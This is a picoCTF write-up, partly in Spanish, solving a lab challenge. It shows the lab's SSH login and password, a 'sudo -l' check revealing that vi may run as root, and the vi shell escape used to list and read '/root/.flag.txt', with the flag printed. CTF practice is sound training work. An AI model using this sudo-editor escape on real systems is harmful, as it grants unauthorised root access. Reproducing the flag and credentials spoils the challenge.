### Descripción
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62697 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?

Hints:
1. What permissions do you have?

### Solución
Con Webshell

```
Sebas115-picoctf@webshell:~$ ssh -p 62697 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls /
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:~$ ls /root
ls: cannot open directory '/root': Permission denied
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ vi

ls: cannot open directory '/root': Permission denied

shell returned 2

Press ENTER or type command to continue
picoplayer@challenge:~$ vi
picoplayer@challenge:~$ sudo vi


Press ENTER or type command to continue
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 22 18:57 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
picoplayer@challenge:~$ sudoo vi
-bash: sudoo: command not found
picoplayer@challenge:~$ sudo vi 
picoplayer@challenge:~$ sudo vi

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```


picoCTF{uS1ng_v1m_3dit0r_ad091ce1}

Al entrar en modo root al editor y utilizar el comando :! ls -al /root para ver los archivos y sus permisos se observa un archivo .flag.txt el cual es el que contiene la bandera.
Se entra como usuario root con sudo al editor y se hace un cat a la bandera para mostrarla.
:! cat /root/.flag.txt
### Notas adicionales


### Referencias
https://webshell.picoctf.org/





